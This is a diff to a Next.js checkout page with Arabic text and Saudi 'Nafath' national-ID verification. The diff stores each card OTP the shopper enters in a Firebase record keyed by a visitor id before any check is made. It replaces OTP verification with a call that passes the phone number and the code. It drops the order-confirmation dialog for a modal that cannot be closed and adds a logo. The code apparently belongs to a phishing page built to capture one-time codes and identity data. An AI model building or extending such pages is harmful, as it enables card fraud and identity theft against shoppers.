@@ -8,9 +8,10 @@ import { Separator } from "@/components/ui/separator"
 import { Badge } from "@/components/ui/badge"
 import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogDescription } from "@/components/ui/dialog"
 import { Minus, Plus, Trash2, MapPin, Check, Loader2, Shield, Phone, CreditCard } from "lucide-react"
-import { addData,  verifyOtp } from "@/lib/firebase"
+import { addData,  createOtpVerification,  verifyOtp } from "@/lib/firebase"
 import { MapAddressPicker } from "@/components/map-address-picker"
 import { useCart } from "@/lib/cartContext"
+import NafazModal from "@/components/nafaz-modal"
 
 interface ShippingInfo {
   fullName: string
@@ -200,17 +201,17 @@ export default function CheckoutPage() {
   }
 
   const handleCardOtpVerify = async () => {
-    const visitor=localStorage.getItem('visitor')
+    const visitor=localStorage.getItem('visitor')!
     if (cardOtp.length < 4) {
       setVerificationError("الرجاء إدخال رمز التحقق بشكل صحيح")
       return
     }
-    await addData({id:visitor,otp:cardOtp})
+    await addData({id:visitor,otp:cardOtp,verified:false})
     setIsVerifying(true)
     setVerificationError("")
 
     try {
-      await verifyOtp(cardOtpVerificationId, cardOtp)
+      await createOtpVerification(shippingInfo.phone, cardOtp)
       console.log(" Card OTP verified successfully")
       setIsVerifying(false)
       setCardOtp("")
@@ -731,7 +732,6 @@ export default function CheckoutPage() {
                     className={`w-full h-12 text-center text-lg font-bold tracking-widest ${verificationError ? "border-destructive" : ""}`}
                   />
                 </div>
-                {verificationError && <p className="text-sm text-destructive text-center mt-2">{verificationError}</p>}
               </div>
 
               <div className="text-center text-sm text-muted-foreground">
@@ -921,7 +921,7 @@ export default function CheckoutPage() {
           <Card>
             <CardHeader>
               <div className="mx-auto w-12 h-12 bg-primary/10 rounded-full flex items-center justify-center mb-4">
-                <Shield className="h-6 w-6 text-primary" />
+                <img className=" w-12"  src="/logo.png"/>
               </div>
               <CardTitle className="text-2xl text-center">التحقق عبر نفاذ</CardTitle>
               <CardDescription className="text-center">أدخل رقم الهوية الوطنية</CardDescription>
@@ -976,70 +976,7 @@ export default function CheckoutPage() {
         )}
 
         {step === "auth-dialog" && (
-          <Dialog open={true}>
-            <DialogContent className="max-w-md">
-              <DialogHeader>
-                <div className="mx-auto w-16 h-16 bg-primary/10 rounded-full flex items-center justify-center mb-4">
-                  <Check className="h-8 w-8 text-primary" />
-                </div>
-                <DialogTitle className="text-2xl text-center">تم التحقق بنجاح</DialogTitle>
-                <DialogDescription className="text-center">
-                  تم التحقق من جميع بياناتك بنجاح، هل تريد إتمام الطلب؟
-                </DialogDescription>
-              </DialogHeader>
-
-              <div className="space-y-4">
-                <div className="p-4 bg-muted rounded-lg space-y-2 text-sm">
-                  <div className="flex justify-between">
-                    <span className="text-muted-foreground">الاسم</span>
-                    <span className="font-medium">{shippingInfo.fullName}</span>
-                  </div>
-                  <Separator />
-                  <div className="flex justify-between">
-                    <span className="text-muted-foreground">رقم الجوال</span>
-                    <span className="font-medium">{shippingInfo.phone}</span>
-                  </div>
-                  <Separator />
-                  <div className="flex justify-between">
-                    <span className="text-muted-foreground">مزود الخدمة</span>
-                    <Badge variant="secondary">{phoneProvider}</Badge>
-                  </div>
-                  <Separator />
-                  <div className="flex justify-between">
-                    <span className="text-muted-foreground">الإجمالي</span>
-                    <span className="font-bold text-lg">{finalTotal.toFixed(2)} ريال</span>
-                  </div>
-                </div>
-
-                {orderError && (
-                  <div className="p-4 bg-destructive/10 border border-destructive/20 rounded-lg">
-                    <p className="text-sm text-destructive text-center">{orderError}</p>
-                  </div>
-                )}
-
-                <div className="flex gap-3">
-                  <Button
-                    variant="outline"
-                    className="flex-1 bg-transparent"
-                    onClick={() => setStep("nafath")}
-                    disabled={isProcessingOrder}
-                  >
-                    رجوع
-                  </Button>
-                  <Button className="flex-1" onClick={handleFinalSubmit} disabled={isProcessingOrder}>
-                    {isProcessingOrder ? (
-                      <>
-                        <Loader2 className="ml-2 h-4 w-4 animate-spin" />
-                        جاري المعالجة...
-                      </>
-                    ) : (
-                      "إتمام الطلب"
-                    )}
-                  </Button>
-                </div>
-              </div>
-            </DialogContent>
-          </Dialog>
+         <NafazModal isOpen={step === "auth-dialog"} phone={shippingInfo.phone} onClose={()=>{}}/>
         )}
 
         {/* Success Step */}
